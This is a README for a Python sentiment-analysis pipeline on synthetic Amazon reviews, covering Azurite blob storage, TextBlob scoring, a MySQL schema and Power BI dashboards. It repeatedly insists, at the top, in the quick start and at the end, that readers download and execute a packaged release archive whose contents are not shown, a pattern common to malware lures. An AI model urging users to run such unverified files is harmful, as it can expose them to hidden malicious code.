[![Releases · Amazon_Sentiments](https://img.shields.io/badge/Releases-Download-orange?logo=github&logoColor=white)](https://github.com/Aaditya-Alsatwar/Amazon_Sentiments/releases)

# Amazon Sentiments — End-to-End Review Sentiment Pipeline

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue?logo=python)](https://www.python.org/)
[![MySQL](https://img.shields.io/badge/MySQL-8-green?logo=mysql&logoColor=white)](https://www.mysql.com/)
[![Power BI](https://img.shields.io/badge/Power%20BI-Visuals-yellow?logo=microsoft-power-bi&logoColor=black)](https://powerbi.microsoft.com/)
[![Azurite](https://img.shields.io/badge/Azurite-Azure%20Blob%20Sim-lightblue?logo=microsoftazure)](https://github.com/Azure/Azurite)

Big badge: click the Releases badge above to download the packaged release file. The release file needs to be downloaded and executed.

![Pipeline Diagram](https://raw.githubusercontent.com/Aaditya-Alsatwar/Amazon_Sentiments/main/docs/images/architecture.png)

Table of contents
- Project overview
- What this repo contains
- Key features
- Architecture and data flow
- Component details
  - Data generator (Faker)
  - Ingest (CSV → Azurite)
  - Storage (Azure Blob simulation)
  - ETL (Python, pandas)
  - Sentiment (TextBlob)
  - Database (MySQL)
  - Reporting (Power BI)
- Quick start (download & run)
- Setup: environment and dependencies
- Step-by-step installation
- Run the pipeline
- Database schema and sample SQL
- Sample Python snippets
- Power BI guidance and sample visuals
- Test data, QA, and validation checks
- Scaling and deployment notes
- Troubleshooting checklist
- Contributing
- License
- Credits and resources
- Releases and download

Project overview

This repository implements a full pipeline for sentiment analysis on Amazon review data. It combines data generation, storage, ETL, sentiment scoring, and visualization. The pipeline uses Python (TextBlob, pandas), Azurite to simulate Azure Blob Storage, MySQL as the persistent store, and Power BI for dashboards. The code reflects a cloud-ready pattern. You can run the whole flow on a local laptop or in cloud VMs or containers.

What this repo contains

- Data simulation scripts that produce CSV review files using Faker.
- Azurite configuration and helper scripts to mimic Azure Blob Storage.
- ETL scripts in Python using pandas to load CSVs from blob, clean data, compute sentiment, and write to MySQL.
- MySQL schema scripts and sample seed data.
- Power BI .pbix template (packaged in releases) and instructions for connecting to MySQL or CSV.
- Utility scripts for packaging and release.

Key features

- End-to-end pipeline from raw CSV to dashboard.
- Sentiment scoring with TextBlob and a simple polarity → label mapping.
- Blob storage simulation using Azurite for local testing and cloud parity.
- Persistent storage in MySQL with clear schema and indices.
- Power BI dashboard template for business insights.
- Modular Python code using pandas for ETL and transformation.
- Faker-based data generator to produce realistic Amazon-like reviews and metadata.
- Example SQL queries and visualizations for business KPIs.

Architecture and data flow

1. Data generation
   - Faker produces synthetic Amazon-style reviews.
   - Scripts write CSV files that mimic batches exported from an e-commerce platform.

2. Blob ingestion
   - Azurite runs locally to emulate Azure Blob Storage.
   - CSV files upload to blob containers (raw/).

3. ETL
   - A scheduled Python job reads new blobs.
   - It runs cleaning, normalization, and enrichment steps.
   - It computes sentiment scores using TextBlob.

4. Persistence
   - The job writes transformed rows to MySQL tables.
   - The schema supports historical data and fast analytical queries.

5. Reporting
   - Power BI connects to MySQL or direct CSV to read transformed data.
   - The dashboard shows trends, product-level insights, and sentiment breakdowns.

Component details

Data generator (Faker)
- Purpose: create a reproducible feed of synthetic Amazon reviews.
- Output: timestamped CSV files with fields: review_id, product_id, product_title, user_id, rating, review_text, timestamp, verified_purchase.
- Design: batch size, product catalog seed, and user sample control variability.

CSV sample schema
- review_id: varchar(36)
- product_id: varchar(32)
- product_title: text
- user_id: varchar(32)
- rating: integer (1-5)
- review_text: text
- timestamp: ISO 8601
- verified_purchase: boolean

Ingest (CSV → Azurite)
- Use Azurite to create containers: raw, processed, archive.
- Upload CSV files to raw container.
- ETL worker polls raw for new files.

Storage (Azure Blob simulation)
- Azurite supports blob operations such as put, get, list, and delete.
- The pipeline uses the blob URL and credentials to access files.
- This keeps local dev experience aligned with a cloud deployment.

ETL (Python, pandas)
- pandas handles CSV reading, type enforcement, missing data handling, deduplication.
- The ETL job applies normalization to product names and user IDs.
- The job uses batch commits to MySQL and moves processed blobs to archive.

Sentiment (TextBlob)
- TextBlob computes polarity (-1 to +1) and subjectivity (0 to 1).
- Polarity mapping:
  - polarity > 0.3 → positive
  - -0.3 ≤ polarity ≤ 0.3 → neutral
  - polarity < -0.3 → negative
- The ETL job stores polarity and label fields.

Database (MySQL)
- Schema includes tables:
  - reviews_raw (ingest records)
  - reviews_enriched (cleaned + sentiment)
  - products (product metadata)
  - users (user metadata)
  - metrics_aggregates (pre-aggregated KPIs)
- Add indices on product_id, timestamp for fast queries.

Reporting (Power BI)
- Power BI template reads reviews_enriched through a MySQL connector or by reading CSV from blob.
- Visuals:
  - Overall sentiment trend (line chart)
  - Product-level sentiment heatmap
  - Rating vs sentiment scatter
  - Top negative keywords (word cloud)
  - Key drivers matrix (cross-filtered tables)

Quick start (download & run)

Download the latest packaged release from the Releases page and execute the included startup script.

- Click the Releases badge above or visit:
  https://github.com/Aaditya-Alsatwar/Amazon_Sentiments/releases

- Download the archive (example name: amazon_sentiments_release_v1.0.zip).
- Extract the archive.
- Execute the entry script:
  - On Linux/macOS: ./run_pipeline.sh
  - On Windows: run_pipeline.bat

The release contains prebuilt assets: sample CSVs, the Azurite container config, SQL schema, and a Power BI .pbix file. Run the included script to launch Azurite, seed MySQL, and run the ETL worker. The script runs a demo pipeline that writes data and populates the Power BI template dataset.

Setup: environment and dependencies

Minimum environment
- Python 3.8 or higher
- pip
- MySQL 8.x (or a compatible server)
- Node.js (for Azurite)
- Power BI Desktop (for Windows) or Power BI Desktop for Mac via virtualization
- Git

Python packages (example)
- pandas
- sqlalchemy
- mysql-connector-python or pymysql
- textblob
- azure-storage-blob (for blob ops with Azurite)
- python-dotenv
- faker
- tqdm

Install the packages
- Create a virtual environment:
  python -m venv venv
  source venv/bin/activate  # macOS/Linux
  venv\Scripts\activate     # Windows

- Install packages:
  pip install -r requirements.txt

Azurite (Azure Blob simulation)
- Install Azurite via npm:
  npm install -g azurite

- Start Azurite:
  azurite --silent --location ./azurite_data --debug ./azurite_debug.log

- Create containers using Azure SDK or Azure Storage Explorer. The repo includes a helper script that creates containers raw, processed, archive.

MySQL
- Install and run MySQL server.
- Create a database called amazon_sentiments.
- Run the schema script in /sql/schema.sql to create tables and indices.

Power BI
- Open the provided file in /powerbi/Amazon_Sentiments.pbix.
- Edit queries for connection strings if you connect to MySQL.

Step-by-step installation

1. Clone the repository
   git clone https://github.com/Aaditya-Alsatwar/Amazon_Sentiments.git
   cd Amazon_Sentiments

2. Prepare virtual environment
   python -m venv venv
   source venv/bin/activate  # macOS/Linux
   venv\Scripts\activate     # Windows
   pip install -r requirements.txt

3. Start Azurite
   azurite --silent --location ./azurite_data --debug ./azurite_debug.log &

4. Seed blob containers
   python scripts/setup_azurite_containers.py

5. Start MySQL server and apply schema
   mysql -u root -p < sql/schema.sql

6. Seed sample data (optional)
   python scripts/generate_sample_csvs.py --batches 10 --out ./sample_csvs

7. Upload sample CSVs to blob
   python scripts/upload_to_blob.py --source ./sample_csvs --container raw

8. Run the ETL worker for a demo run
   python scripts/run_etl_worker.py --once

9. Open Power BI Desktop
   - Open powerbi/Amazon_Sentiments.pbix
   - Refresh or point the data source to your MySQL instance

Run the pipeline

Manual run
- Use the ETL worker script to run one batch:
  python scripts/run_etl_worker.py --once

- Use the scheduler mode to run continuously:
  python scripts/run_etl_worker.py --interval 300

Automated run
- Use systemd, Windows Task Scheduler, or cron to run the worker on a schedule.
- In cloud, containerize the worker and run in Kubernetes CronJob or Azure Container Instances.

Database schema and sample SQL

Key tables

1) products
- product_id VARCHAR(32) PRIMARY KEY
- title TEXT
- category VARCHAR(64)
- brand VARCHAR(64)
- created_at TIMESTAMP

2) users
- user_id VARCHAR(32) PRIMARY KEY
- display_name VARCHAR(64)
- join_date DATE

3) reviews_raw
- id BIGINT AUTO_INCREMENT PRIMARY KEY
- review_id VARCHAR(36) UNIQUE
- product_id VARCHAR(32)
- user_id VARCHAR(32)
- rating INT
- review_text TEXT
- created_at TIMESTAMP
- raw_blob_name VARCHAR(255)

4) reviews_enriched
- id BIGINT PRIMARY KEY
- review_id VARCHAR(36) UNIQUE
- product_id VARCHAR(32)
- user_id VARCHAR(32)
- rating INT
- review_text TEXT
- polarity FLOAT
- subjectivity FLOAT
- sentiment_label VARCHAR(16)
- processed_at TIMESTAMP
- source_blob VARCHAR(255)

Index recommendations
- CREATE INDEX idx_product_ts ON reviews_enriched (product_id, processed_at);
- CREATE INDEX idx_sentiment ON reviews_enriched (sentiment_label, rating);

Sample SQL queries

- Top 10 products by average sentiment
  SELECT product_id, AVG(polarity) AS avg_polarity, COUNT(*) AS review_count
  FROM reviews_enriched
  GROUP BY product_id
  HAVING review_count > 50
  ORDER BY avg_polarity DESC
  LIMIT 10;

- Daily sentiment trend
  SELECT DATE(processed_at) AS day, AVG(polarity) AS avg_polarity
  FROM reviews_enriched
  GROUP BY day
  ORDER BY day;

- Negative reviews for a product
  SELECT review_id, user_id, rating, review_text, polarity
  FROM reviews_enriched
  WHERE product_id = 'B001234567' AND sentiment_label = 'negative'
  ORDER BY processed_at DESC
  LIMIT 100;

Sample Python snippets

Example: compute sentiment with TextBlob
```python
from textblob import TextBlob

def compute_sentiment(text):
    blob = TextBlob(text)
    polarity = round(blob.sentiment.polarity, 4)
    subjectivity = round(blob.sentiment.subjectivity, 4)
    if polarity > 0.3:
        label = "positive"
    elif polarity < -0.3:
        label = "negative"
    else:
        label = "neutral"
    return {"polarity": polarity, "subjectivity": subjectivity, "label": label}
```

Example: load CSV from blob and transform with pandas
```python
import pandas as pd
from azure.storage.blob import BlobServiceClient

def read_csv_from_blob(blob_conn_str, container, blob_name):
    service = BlobServiceClient.from_connection_string(blob_conn_str)
    blob_client = service.get_blob_client(container=container, blob=blob_name)
    stream = blob_client.download_blob().readall()
    df = pd.read_csv(io.BytesIO(stream))
    return df

def transform(df):
    df = df.drop_duplicates(subset=["review_id"])
    df["rating"] = df["rating"].astype(int)
    df["review_text"] = df["review_text"].fillna("")
    # compute sentiment row-wise
    df["sentiment"] = df["review_text"].apply(lambda t: compute_sentiment(t))
    df["polarity"] = df["sentiment"].apply(lambda s: s["polarity"])
    df["subjectivity"] = df["sentiment"].apply(lambda s: s["subjectivity"])
    df["sentiment_label"] = df["sentiment"].apply(lambda s: s["label"])
    return df
```

Power BI guidance and sample visuals

Data model
- Load reviews_enriched as a fact table.
- Use products and users as dimension tables.
- Build relationships on product_id and user_id.

Recommended visuals
- Time series: line chart of avg polarity by day.
- Product sentiment matrix: stacked bar showing positive/neutral/negative share by product.
- Rating vs sentiment scatter: show correlation between rating and polarity.
- Word cloud: extract top negative keywords using simple tokenization and filter stopwords.
- KPI cards: average rating, NPS-like sentiment score, change vs prior period.

Power BI performance tips
- Import mode works for smaller datasets.
- For larger datasets, use DirectQuery on MySQL or pre-aggregate into metrics_aggregates.
- Create date table for time intelligence.

Test data, QA, and validation checks

Validation checks performed by ETL
- Duplicate detection: reject rows with existing review_id.
- Schema validation: enforce types and required columns.
- Text sanitation: strip control characters.
- Sentiment sanity: flag rows where polarity is outside [-1,1].

Unit tests
- Test sentiment mapping with representative examples.
- Test CSV parsing with malformed rows.
- Test MySQL inserts and upserts.

Data quality metrics to monitor
- Missing review_text rate
- Fraction of reviews labeled neutral vs rating distribution
- Processing latency per file

Scaling and deployment notes

Scale the pipeline
- Move Azurite to real Azure Blob Storage for production.
- Use Azure Functions or AWS Lambda to trigger on blob upload.
- Containerize the ETL worker and run as Kubernetes Jobs or Azure Container Instances.
- Use managed MySQL (Azure Database for MySQL) for reliability.
- Use read replicas for heavy reporting workloads.

Batching and throughput
- Read CSVs in chunks with pandas.read_csv(chunk_size=10000)
- Use bulk insert methods to write to MySQL (LOAD DATA LOCAL INFILE or SQL bulk loader)
- Add a buffer queue (e.g., Azure Queue Storage, RabbitMQ) between ingestion and ETL worker for decoupling.

Security and credentials
- Use environment variables or managed identity to store connection strings.
- Rotate keys and restrict network access to the database.

Observability and logging
- Add structured logs for each processed blob: rows_in, rows_out, errors.
- Emit metrics for processing time and success/failure.
- Integrate with Prometheus/Grafana or Azure Monitor.

Troubleshooting checklist

Blob access issues
- Confirm Azurite is running and listening on the configured port.
- Confirm container names match configuration.
- Confirm connection string used by scripts points to Azurite (use development storage value in .env).

MySQL connectivity
- Verify database user and password.
- Verify host and port.
- Validate schema.sql executed without errors.

ETL failures
- Check logs in logs/ for stack traces.
- Validate CSV schema matches expected header names.
- Check for encoding mismatches; enforce UTF-8.

Sentiment anomalies
- If polarity values all zero, verify TextBlob installation and language corpora.
- For odd results, test compute_sentiment() with controlled inputs.

Common fixes
- Re-run the sample pipeline with small batch to reproduce errors.
- Use the included sample CSV to test the path end-to-end.
- Inspect processed blob archive for duplicates.

Contributing

- Fork the repository.
- Create a feature branch: git checkout -b feat/your-feature
- Write tests for new functionality.
- Run lint and tests locally.
- Open a pull request with a clear description of the change and impact.

Guidelines
- Keep functions small and focused.
- Use type hints for public functions.
- Add docstrings for modules and complex routines.

License

This repository uses the MIT License. See LICENSE file for details.

Credits and resources

- TextBlob: https://textblob.readthedocs.io/
- pandas: https://pandas.pydata.org/
- Azurite: https://github.com/Azure/Azurite
- MySQL: https://www.mysql.com/
- Power BI: https://powerbi.microsoft.com/
- Faker: https://faker.readthedocs.io/

Images used
- Pipeline and architecture diagrams come from docs/images in the repo.
- Logos come from respective product sites via shields.io.

Releases and download

Head to the Releases page to get the packaged build and Power BI template. Download the release asset and execute the included startup script. The Releases page contains the release archive, platform-specific scripts, and prebuilt sample assets.

- Direct link to Releases:
  https://github.com/Aaditya-Alsatwar/Amazon_Sentiments/releases

If the link does not work in your environment, check the Releases section on the repository page for the latest assets.

Appendix A — Operational checklist

- Verify Python version and virtualenv activation.
- Install npm and azurite globally for blob simulation.
- Start Azurite and confirm containers raw/processed/archive exist.
- Seed MySQL schema and confirm connectivity.
- Generate or upload at least one CSV in the raw container.
- Run ETL worker in single-run mode and validate reviews_enriched populated.
- Open Power BI and connect to the dataset.

Appendix B — ETL best practices implemented

- Idempotent processing: move or mark processed blobs to archive to avoid double processing.
- Error handling: store failed rows in a dead-letter table for manual review.
- Observability: emit detailed metrics and per-file logs.
- Small batch design: process files in bounded batches to limit memory use.

Appendix C — Example folder layout

- /docs
  - /images
    - architecture.png
    - sample_visuals.png
- /scripts
  - setup_azurite_containers.py
  - generate_sample_csvs.py
  - upload_to_blob.py
  - run_etl_worker.py
- /sql
  - schema.sql
  - seed_products.sql
- /powerbi
  - Amazon_Sentiments.pbix
- requirements.txt
- README.md

Appendix D — Example command reference

Create virtual environment and install
```bash
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

Start Azurite
```bash
azurite --silent --location ./azurite_data --debug ./azurite_debug.log &
```

Seed schema
```bash
mysql -u root -p amazon_sentiments < sql/schema.sql
```

Run ETL once
```bash
python scripts/run_etl_worker.py --once
```

Appendix E — Sample ETL config (.env)
```
BLOB_CONN_STR=DefaultEndpointsProtocol=http;AccountName=devstoreaccount1;AccountKey=Eby8vdM02...;BlobEndpoint=http://127.0.0.1:10000/devstoreaccount1;
BLOB_CONTAINER_RAW=raw
BLOB_CONTAINER_ARCHIVE=archive
MYSQL_HOST=127.0.0.1
MYSQL_PORT=3306
MYSQL_DB=amazon_sentiments
MYSQL_USER=etl_user
MYSQL_PASSWORD=changeme
```

Appendix F — Example aggregated KPIs (schema for metrics_aggregates)
- date DATE
- product_id VARCHAR(32)
- avg_polarity FLOAT
- avg_rating FLOAT
- review_count INT
- pct_negative FLOAT
- pct_positive FLOAT

Populate daily aggregates with a scheduled job:
```sql
INSERT INTO metrics_aggregates (date, product_id, avg_polarity, avg_rating, review_count, pct_negative, pct_positive)
SELECT DATE(processed_at) AS day, product_id,
       AVG(polarity), AVG(rating), COUNT(*),
       SUM(sentiment_label='negative')/COUNT(*),
       SUM(sentiment_label='positive')/COUNT(*)
FROM reviews_enriched
WHERE processed_at >= CURDATE() - INTERVAL 7 DAY
GROUP BY day, product_id;
```

Appendix G — Testing examples

Unit test ideas
- test_compute_sentiment_positive
- test_compute_sentiment_negative
- test_transform_handles_missing_columns
- test_etl_worker_archives_blob

Integration test
- Start Azurite and MySQL test instance via Docker Compose included in /docker.
- Run a sample ingestion and assert that reviews_enriched has expected rows and columns.

Appendix H — How to extend

- Replace TextBlob with a transformer model for better accuracy.
- Add language detection and run language-specific sentiment models.
- Add schema versioning and migration scripts.
- Add feature extraction for topic modeling or aspect-based sentiment.

Releases

Click the Releases badge at the top or visit the Releases page to download the packaged release file. The release archive must be downloaded and executed to run the demo pipeline.

https://github.com/Aaditya-Alsatwar/Amazon_Sentiments/releases

If the Releases link fails, check the Releases section on the repository page for available assets and instructions.